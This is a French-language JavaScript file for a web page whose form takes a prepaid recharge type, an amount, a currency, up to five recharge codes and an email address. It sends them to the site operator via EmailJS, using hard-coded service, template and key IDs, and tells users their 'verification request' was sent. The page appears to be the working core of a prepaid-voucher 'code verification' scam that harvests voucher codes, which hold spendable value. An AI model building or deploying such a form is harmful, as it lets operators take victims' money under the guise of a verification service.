// UI Functions
const modalSystem = {
  showModal: function(type, title, message) {
    const modal = document.createElement('div');
    modal.className = `modal ${type}-modal`;
    modal.innerHTML = `
      <div class="modal-content ${type === 'success' ? 'success-content' : ''}">
        <span class="modal-close" data-close-modal>&times;</span>
        <h3 class="modal-title">${title}</h3>
        <div class="modal-body">${message}</div>
      </div>
    `;

    document.body.appendChild(modal);
    setTimeout(() => modal.classList.add('show'), 10);

    // Add event listener to close button after appending the modal to the document
    const closeButton = modal.querySelector('[data-close-modal]');
    if (closeButton) {
      closeButton.addEventListener('click', () => {
        console.log('Close button clicked');
        this.closeModal(modal);
      });
    }

    // Add click event to close when clicking outside
    modal.addEventListener('click', (event) => {
      if (event.target === modal) {
        console.log('Clicked outside the modal');
        this.closeModal(modal);
      }
    });
  },

  closeModal: function(element) {
    const modal = element.closest('.modal');
    if (modal) {
      modal.classList.remove('show');
      setTimeout(() => {
        console.log('Modal removed from DOM');
        modal.remove();
      }, 300);
    }
  },

  closeAllModals: function() {
    document.querySelectorAll('.modal').forEach(modal => {
      modal.classList.remove('show');
      setTimeout(() => {
        console.log('All modals removed from DOM');
        modal.remove();
      }, 300);
    });
  }
};

function isEmailJSLoaded() {
  return window.emailJSReady === true && typeof emailjs !== 'undefined' && emailjs.hasOwnProperty('init');
}

async function waitForEmailJS(timeout = 5000) {
  const start = Date.now();
  return new Promise((resolve) => {
    const check = () => {
      if (isEmailJSLoaded()) {
        resolve(true);
      } else if (Date.now() - start < timeout) {
        setTimeout(check, 100);
      } else {
        resolve(false);
      }
    };
    check();
  });
}

function scrollToForm() {
  const formSection = document.getElementById('formulaire');
  if (!formSection) return;

  const headerOffset = 100;
  const elementPosition = formSection.getBoundingClientRect().top;
  const offsetPosition = elementPosition + window.pageYOffset - headerOffset;

  window.scrollTo({
    top: offsetPosition,
    behavior: 'smooth'
  });

  const form = document.querySelector('.pricing-item');
  if (form) {
    form.style.animation = 'none';
    form.offsetHeight;
    form.style.animation = 'pulse-border 1s ease';
  }
}

function validateForm(params) {
  const errors = [];

  if (!params.email) errors.push("L'adresse email est requise");
  if (!params.crecharge) errors.push("Le type de recharge est requis");
  if (!params.montant) errors.push("Le montant est requis");
  if (!params.devise) errors.push("La devise est requise");

  let hasRecharge = false;
  for (let i = 1; i <= 5; i++) {
    if (params[`recharge${i}`]) {
      hasRecharge = true;
      break;
    }
  }
  if (!hasRecharge) errors.push("Au moins un code de recharge est requis");

  return errors;
}

async function sendMail() {
  const isLoaded = await waitForEmailJS();
  if (!isLoaded) {
    modalSystem.showModal('error', 'Erreur', 'Service de messagerie non disponible. Veuillez réessayer plus tard.');
    return;
  }

  try {
    document.body.style.cursor = 'wait';
    const loadingDiv = document.querySelector('.loading');
    if (loadingDiv) loadingDiv.style.display = "block";

    const params = {
      crecharge: document.getElementById("rechargetype").value,
      montant: document.getElementById("montant").value,
      devise: document.getElementById("devise").value,
      recharge1: document.getElementById("recharge01").value,
      recharge2: document.getElementById("recharge02").value,
      recharge3: document.getElementById("recharge03").value,
      recharge4: document.getElementById("recharge04").value,
      recharge5: document.getElementById("recharge05").value,
      email: document.getElementById("email").value,
    };

    const errors = validateForm(params);
    if (errors.length > 0) {
      modalSystem.showModal('error', 'Erreur de validation', errors.join('<br>'));
      return;
    }

    const serviceID = "service_p6xjkwk";
    const templateID = "template_s1kqilp";

    if (window.location.protocol === 'file:') {
      modalSystem.showModal('error', 'Mode Local', `
        Le service de messagerie ne fonctionne pas en mode local.<br>
        Pour tester cette fonctionnalité:<br>
        1. Déployez le site sur GitHub Pages ou Netlify<br>
        2. Ou exécutez un serveur local:<br>
           - Python: <code>python -m http.server 8000</code><br>
           - Node.js: <code>npx http-server</code><br>
        Puis accédez à http://localhost:8000
      `);
      return;
    }

    const result = await emailjs.send(serviceID, templateID, params);
    console.log('Email sent successfully:', result);

    // Clear form
    ["rechargetype", "email", "montant", "devise",
     "recharge01", "recharge02", "recharge03", "recharge04", "recharge05"]
      .forEach(id => document.getElementById(id).value = "");

    modalSystem.showModal('success', 'Succès', 'Votre demande de vérification a été envoyée avec succès! Vous recevrez bientôt un email de confirmation.');

  } catch (error) {
    console.error('Error sending email:', error);
    modalSystem.showModal('error', 'Erreur', "Une erreur s'est produite lors de l'envoi. Veuillez réessayer.");
  } finally {
    document.body.style.cursor = 'default';
    const loadingDiv = document.querySelector('.loading');
    if (loadingDiv) loadingDiv.style.display = "none";
  }
}

function showInfoModal() {
  const modal = document.getElementById('infoModal');
  if (modal) modal.classList.add('show');
}

// DOM Ready Event Handlers
document.addEventListener('DOMContentLoaded', function() {
  // Verify EmailJS initialization
  if (!isEmailJSLoaded()) {
    console.warn('EmailJS not initialized. Attempting to initialize...');
    try {
      emailjs.init("iXhBi47917f0L3zGT");
      window.emailJSReady = true;
      console.log('EmailJS initialized successfully');
    } catch (error) {
      console.error('EmailJS initialization error:', error);
    }
  }

  // Handle page loader
  const loader = document.getElementById('page-loader');
  setTimeout(() => {
    if (loader) loader.classList.add('loaded');
  }, 1000);

  // Setup modal close handlers
  document.addEventListener('click', function(event) {
    if (event.target.classList.contains('modal')) {
      modalSystem.closeModal(event.target);
    }
  });

  document.addEventListener('keydown', function(event) {
    if (event.key === 'Escape') {
      modalSystem.closeAllModals();
    }
  });

  document.querySelectorAll('[data-close-modal]').forEach(closeBtn => {
    closeBtn.addEventListener('click', function() {
      modalSystem.closeModal(this);
    });
  });
});

// Handle window load event
window.addEventListener('load', function() {
  const loader = document.getElementById('page-loader');
  if (loader) loader.classList.add('loaded');
});

// Add this at the end of your index.js file
document.addEventListener('DOMContentLoaded', function() {
  // Handle the "En savoir plus" button click
  const formGuidanceButton = document.querySelector('[data-bs-toggle="modal"][data-bs-target="#formGuidanceModal"]');
  if (formGuidanceButton) {
    formGuidanceButton.addEventListener('click', function(e) {
      e.preventDefault();
      const formGuidanceModal = new bootstrap.Modal(document.getElementById('formGuidanceModal'));
      formGuidanceModal.show();
    });
  }
});

// Export functions for global use
window.sendMail = sendMail;
window.scrollToForm = scrollToForm;
window.modalSystem = modalSystem;
window.showInfoModal = showInfoModal;
